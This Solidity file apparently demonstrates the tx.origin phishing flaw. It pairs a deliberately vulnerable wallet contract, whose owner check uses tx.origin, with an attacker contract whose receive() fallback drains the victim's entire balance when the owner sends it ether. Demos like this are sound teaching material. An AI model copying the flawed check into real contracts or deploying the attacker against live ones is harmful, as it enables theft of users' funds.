// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;  
//pragma solidity ^0.8.0;



contract HackmePhishing {
    address payable public owner;
    uint public balance;

    constructor(address _owner) payable {
        owner = payable(_owner);
        balance = msg.value;
    }

    modifier wrongOnlyOwner() {
        require(tx.origin == owner, "You're not the owner!");
        _;
    }

    function transfer(address _to, uint _amount) wrongOnlyOwner public {
        require(_amount <= address(this).balance, "Insufficient balance to withdraw");
        (bool success, ) = _to.call{value: _amount}("");
        require(success, "Transaction failed!");
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

}



contract AttackerPhishing {
    address payable public owner;
    HackmePhishing victim;

    constructor(address _owner, address _victim) payable{
        owner = payable(_owner);
        victim = HackmePhishing(_victim);
    }


    function attack() public {
        uint balance = victim.getBalance();
        victim.transfer(owner, balance);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    receive() payable external {
        attack();
    }
}